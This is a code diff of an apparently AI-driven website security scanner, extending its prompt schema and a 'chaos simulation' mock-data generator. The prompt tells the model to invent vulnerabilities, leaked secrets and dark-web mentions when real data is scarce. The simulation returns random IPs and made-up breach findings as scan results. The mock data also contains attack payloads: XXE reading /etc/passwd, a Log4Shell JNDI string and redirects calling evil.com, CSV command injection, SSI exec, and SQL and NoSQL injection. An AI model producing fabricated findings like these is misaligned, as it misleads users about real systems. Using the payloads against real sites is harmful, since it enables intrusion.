@@ -152,12 +152,13 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
     
     IMPORTANT: 
     - IF NO CRITICAL VULNERABILITIES FOUND, GENERATE THEORETICAL VECTORS BASED ON TECH STACK.
-    - DO NOT RETURN EMPTY ARRAYS. POPULATE 'darkWebMentions', 'exposedSecrets' WITH INFERRED DATA IF REAL DATA SCARCE.
+    - DO NOT RETURN EMPTY ARRAYS. POPULATE 'darkWebMentions', 'exposedSecrets', 'archiveEndpoints' WITH INFERRED DATA IF REAL DATA SCARCE.
 
     JSON STRUCTURE:
     {
       "summary": "String",
       "techStack": ["String"],
+      "targetIp": "String",
       "reputationScore": 50,
       "securityGrade": "F",
       "subdomains": ["String"],
@@ -176,8 +177,10 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
       "pathTraversal": [{"type": "LFI", "parameter": "file"}],
       "ssrf": [{"parameter": "url"}],
       "apiEndpoints": ["/api/v1"],
-      "rateLimiting": [{"endpoint": "/login", "risk": "High"}],
+      "rateLimiting": [{"endpoint": "/login", "risk": "High", "description": "Brute-force possible"}],
+      "apiSecurity": [{"type": "BOLA", "parameter": "id", "risk": "High", "description": "Auth object access"}],
       "securityHeaders": [{"name": "X-Frame-Options", "value": "DENY", "status": "SECURE"}],
+      "sslInfo": {"issuer": "Let's Encrypt", "protocol": "TLS 1.3", "validTo": "2025-01-01", "grade": "A"},
       "jwtFlaws": [{"location": "Header", "flaw": "None Alg", "impact": "Account Takeover"}],
       "requestSmuggling": [{"type": "CL.TE", "endpoint": "/", "risk": "Cache Poisoning"}],
       "raceConditions": [], "xxeVectors": [{"endpoint": "/api", "payload": "...", "type": "Blind"}], "corsFlaws": [], "hostHeaderFlaws": [],
@@ -191,7 +194,8 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
       "prototypePollution": [], "deserializationFlaws": [], "cachePoisoning": [],
       "exposedSecrets": [], "darkWebMentions": [],
       "publicDocuments": [], "archiveEndpoints": [], "employeeIntel": [],
-      "os": "Linux", "geolocation": {}, "whois": {}
+      "os": "Linux", "geolocation": {}, "whois": {},
+      "mailSecurity": { "spf": false, "dmarc": false, "spoofingPossible": true, "findings": [] }
     }
     
     INSTRUCTIONS (AGGRESSIVE_MODE ONLY):
@@ -256,8 +260,8 @@ export const analyzeSite = async (url: string, mode: ScanMode): Promise<SiteAnal
            11. WEBSOCKET: Check for cross-site websocket hijacking.
            12. SSI: Check for server-side includes in HTML inputs.
            13. HIDDEN PARAMS: Infer debug parameters like ?debug=true.
-           14. GIT: Check for /.git/ exposure.
-           15. BACKUPS: Check for .bak, .swp, .old files.
+           14. GIT: Check for /.git/ exposure. Search for 'site:${url} inurl:/.git' OR 'site:${url} intitle:"index of" .git'.
+           15. BACKUPS (SOURCE LEAK): Check for .bak, .swp, .old, .save, .orig, and ~ files exposed in webroot.
            16. LOG4SHELL: Check for JNDI vectors in headers.
            17. SPRING4SHELL: Check for class loader manipulation.
            18. OPEN REDIRECT: Check for unvalidated redirects.
@@ -418,9 +422,15 @@ const sanitizeData = (data: any, mode: ScanMode): SiteAnalysisData => {
     data.graphql = !!data.graphql;
     data.sslInfo = data.sslInfo || {};
     
+    if (!data.targetIp) data.targetIp = generateRandomIP(); // Use mock IP if missing
     if (!data.os) data.os = "Unknown (Protected)";
     if (!data.geolocation) data.geolocation = { country: "Unknown", isp: "Cloudflare/AWS" };
     if (!data.whois) data.whois = { registrar: "Redacted", createdDate: "Unknown" };
+    
+    // Explicitly handle MailSecurity to ensure it exists even if AI omitted it
+    if (!data.mailSecurity) {
+        data.mailSecurity = { spf: false, dmarc: false, spoofingPossible: false, findings: [] };
+    }
 
     return data;
 };
@@ -454,6 +464,7 @@ const getChaosData = (url: string, mode: ScanMode): SiteAnalysisData => {
     return sanitizeData({
         summary: `Scan completed (CHAOS SIMULATION). The target ${domain} exhibits ${isAggressive ? 'CRITICAL architectural vulnerabilities' : 'significant OSINT exposure'}. Analysis of ${currentTech.join(', ')} indicates ${isAggressive ? 'RCE and Injection vectors' : 'data leakage risks'}.`,
         techStack: currentTech,
+        targetIp: generateRandomIP(),
         reputationScore: getRandomInt(10, 40),
         securityGrade: 'F',
         subdomains: [`dev.${domain}`, `api.${domain}`, `admin.${domain}`],
@@ -497,12 +508,61 @@ const getChaosData = (url: string, mode: ScanMode): SiteAnalysisData => {
         ] : [],
         apiEndpoints: [`/api/v1/${baseName}`, "/api/auth/login"],
         rateLimiting: [{ endpoint: "/api/login", risk: "High", description: "No rate limiting detected." }],
+        apiSecurity: [{ type: "Broken Object Level Auth", parameter: "user_id", risk: "Critical", description: "Insecure direct object reference found." }],
         securityHeaders: [
             { name: "X-Frame-Options", value: "Missing", status: "WEAK" },
             { name: "Strict-Transport-Security", value: "Missing", status: "WEAK" }
         ],
         
-        // Populate Dark Arts & Elite Vectors
+        sslInfo: { issuer: "Let's Encrypt Authority X3", protocol: "TLS 1.3", validTo: "2025-12-31", grade: "A" },
+
+        // --- RICH CHAOS DATA INJECTION (NOISE PROTOCOL) ---
+        publicDocuments: [
+            { type: "Config", url: `https://${domain}/.env`, description: "Environment file exposed" },
+            { type: "Backup", url: `https://${domain}/db_backup.sql`, description: "Database dump found" },
+            `https://${domain}/internal_policy.pdf`
+        ],
+        
+        archiveEndpoints: [
+            { type: "Deprecated API", url: `https://${domain}/api/v1/user`, description: "Potential IDOR in legacy version", risk: "Medium" },
+            { type: "Old Login", url: `https://${domain}/login_old.php`, description: "Bypass modern auth protections", risk: "High" },
+            { type: "Backup Dir", url: `https://${domain}/backup/2023/`, description: "Directory indexing enabled", risk: "Low" }
+        ],
+        
+        exposedSecrets: [
+            { type: "API Key", platform: "GitHub", url: "https://github.com/search?q=company", description: "AWS Secret Key in commit history" },
+            { type: "DB Creds", platform: "Pastebin", url: "https://pastebin.com/raw/...", description: "MySQL Connection String Leaked" }
+        ],
+        
+        darkWebMentions: [
+            { type: "Breach", source: "BreachForums", description: "500k User records leaked (2024)" },
+            { type: "Stealer Log", source: "Russian Market", description: "Admin session cookies found in RedLine log" }
+        ],
+        
+        clientSideIntel: {
+            hardcodedSecrets: [
+                { name: "Stripe API Key", value: "pk_live_51Hz...", location: "main.js:450", severity: "HIGH" },
+                { name: "Google Maps Key", value: "AIzaSyD...", location: "contact.js:12", severity: "MEDIUM" }
+            ],
+            dangerousFunctions: [
+                { function: "dangerouslySetInnerHTML", risk: "DOM XSS", location: "App.js:212" },
+                { function: "eval()", risk: "RCE", location: "calc.js:5" }
+            ]
+        },
+        
+        subdomainTakeover: [
+            { subdomain: `blog.${domain}`, provider: "AWS S3", status: "VULNERABLE", fingerprint: "NoSuchBucket" },
+            { subdomain: `shop.${domain}`, provider: "Shopify", status: "SAFE", fingerprint: "Connected" }
+        ],
+        
+        mailSecurity: {
+            spf: false,
+            dmarc: false,
+            spoofingPossible: true,
+            findings: ["SPF record allows softfail (~all)", "DMARC policy not set (p=none)"]
+        },
+
+        // Dark Arts & Elite Vectors
         supplyChainRisks: isAggressive ? [{ packageName: `@${baseName}/utils`, ecosystem: "npm", riskLevel: "HIGH", location: "package.json", description: "Internal dependency confusion risk." }] : [],
         sstiVectors: isAggressive ? [{ engine: "Jinja2", parameter: "name", payload: "{{7*7}}", curlCommand: "curl..." }] : [],
         
@@ -529,38 +589,84 @@ const getChaosData = (url: string, mode: ScanMode): SiteAnalysisData => {
         ] : [],
         
         requestSmuggling: isAggressive ? [
-            { type: "CL.TE", endpoint: "/", risk: "Request Hijacking (Frontend sees Content-Length)" },
-            { type: "TE.CL", endpoint: "/api/internal", risk: "Cache Poisoning (Backend sees Transfer-Encoding)" }
+            { type: "CL.TE", endpoint: "/login", risk: "Request Hijacking" },
+            { type: "TE.CL", endpoint: "/static/image.png", risk: "Cache Poisoning" }
         ] : [],
-        raceConditions: isAggressive ? [{ endpoint: "/api/coupon", mechanism: "Double Spending", description: "Race condition on coupon redemption." }] : [],
-        xxeVectors: isAggressive ? [
-            { endpoint: "/api/soap", payload: "<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", type: "Blind LFI" },
-            { endpoint: "/xmlrpc.php", payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", type: "RCE (Expect Wrapper)" }
-        ] : [],
-        corsFlaws: isAggressive ? [{ origin: "null", credentials: true, impact: "Data Exfiltration" }] : [],
-        hostHeaderFlaws: [], noSqlVectors: [], 
-        ldapVectors: isAggressive ? [{ parameter: "user", payload: "*)(&)", type: "Auth Bypass" }] : [],
-        blindSqli: isAggressive ? [{ parameter: "uuid", payload: "WAITFOR DELAY", dbType: "MSSQL" }] : [],
-        csvInjections: [], webSocketFlaws: [], 
-        ssiVectors: isAggressive ? [{ endpoint: "/index.shtml", payload: "<!--#exec cmd=\"ls\" -->" }] : [],
-        hiddenParameters: [], 
-        gitExposures: isAggressive ? [{ url: `https://${domain}/.git/config`, content: "Config" }] : [],
-        backupFiles: [], log4jVectors: [], spring4ShellVectors: [], openRedirects: [], 
-        massAssignments: isAggressive ? [{ endpoint: "/api/profile", parameter: "\"role\": \"admin\"" }] : [],
-        pickleFlaws: [],
         
-        subdomainTakeover: [{ subdomain: `dev.${domain}`, provider: "Heroku", status: "VULNERABLE", fingerprint: "Verified Not Found" }],
-        clientSideIntel: {
-            hardcodedSecrets: [{ name: "AWS Key", value: "AKIAIOSFODNN7EXAMPLE", location: "app.js:402", severity: "CRITICAL" }],
-            dangerousFunctions: [{ function: "eval()", risk: "RCE", location: "utils.js:55" }]
-        },
-        mailSecurity: { spf: false, dmarc: false, spoofingPossible: true, findings: ["No DMARC record found."] },
-        publicDocuments: ["Confidential_Memo.pdf", "Financials_2024.xls", "deploy.yml", "db_dump.sql", "nginx.conf", "server.pem", "docker-compose.yml"],
-        archiveEndpoints: ["/v1/login", "/admin_old.php"],
-        exposedSecrets: [{ type: "GitHub", description: "Stripe Secret Key leaked in repo.", url: `https://github.com/search?q=${domain}` }],
-        darkWebMentions: [{ type: "Breach", description: "Admin password exposed in 2023 Combo List.", url: "#" }],
+        raceConditions: isAggressive ? [
+            { endpoint: "/api/coupons/apply", mechanism: "Double Spending", description: "Time-of-check to time-ofuse flaw in coupon logic." }
+        ] : [],
+        
+        xxeVectors: isAggressive ? [
+            { endpoint: "/api/soap", payload: "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>", type: "Error-based" }
+        ] : [],
+        
+        corsFlaws: isAggressive ? [
+            { origin: "null", credentials: true, impact: "Data Exfiltration" }
+        ] : [],
+        
+        hostHeaderFlaws: isAggressive ? [
+            { type: "Password Reset Poisoning", payload: "Host: evil.com" }
+        ] : [],
+        
+        noSqlVectors: isAggressive ? [
+            { parameter: "username", payload: "{\"$ne\": null}", type: "Auth Bypass" }
+        ] : [],
+        
+        ldapVectors: isAggressive ? [
+            { parameter: "user", payload: "*)(&)", type: "Auth Bypass" }
+        ] : [],
+        
+        blindSqli: isAggressive ? [
+            { parameter: "id", payload: "WAITFOR DELAY '0:0:5'--", dbType: "MSSQL" }
+        ] : [],
+        
+        csvInjections: isAggressive ? [
+            { parameter: "fullname", payload: "=cmd|' /C calc'!A0", context: "Export Feature" }
+        ] : [],
+        
+        webSocketFlaws: isAggressive ? [
+            { endpoint: "/ws/chat", flaw: "CSWSH" }
+        ] : [],
+        
+        ssiVectors: isAggressive ? [
+            { endpoint: "/index.shtml", payload: "<!--#exec cmd=\"ls\" -->" }
+        ] : [],
+        
+        hiddenParameters: isAggressive ? [
+            { name: "debug", location: "/api/v1", type: "Debug Mechanism" }
+        ] : [],
+        
+        gitExposures: isAggressive ? [
+            { url: `https://${domain}/.git/config`, content: "Config" }
+        ] : [],
+        
+        backupFiles: isAggressive ? [
+            { url: `https://${domain}/config.php.bak`, type: "Source Leak" }
+        ] : [],
+        
+        log4jVectors: isAggressive ? [
+            { location: "User-Agent", payload: "${jndi:ldap://evil.com/x}" }
+        ] : [],
+        
+        spring4ShellVectors: isAggressive ? [
+            { location: "Parameter", payload: "class.module.classLoader..." }
+        ] : [],
+        
+        openRedirects: isAggressive ? [
+            { parameter: "redirect", payload: "//evil.com" }
+        ] : [],
+        
+        massAssignments: isAggressive ? [
+            { endpoint: "/api/signup", parameter: "\"is_admin\": true" }
+        ] : [],
+        
+        pickleFlaws: isAggressive ? [
+            { parameter: "data", description: "Base64 encoded Python pickle detected." }
+        ] : [],
+
         os: currentOS,
-        geolocation: { country: currentGeo.country, city: currentGeo.city, isp: currentGeo.isp },
-        whois: { registrar: "MarkMonitor, Inc.", createdDate: "2015-08-14", expiryDate: "2025-08-14" }
+        geolocation: currentGeo,
+        whois: { registrar: "MarkMonitor Inc.", createdDate: "2015-04-12", expiryDate: "2025-04-12" }
     }, mode);
 };
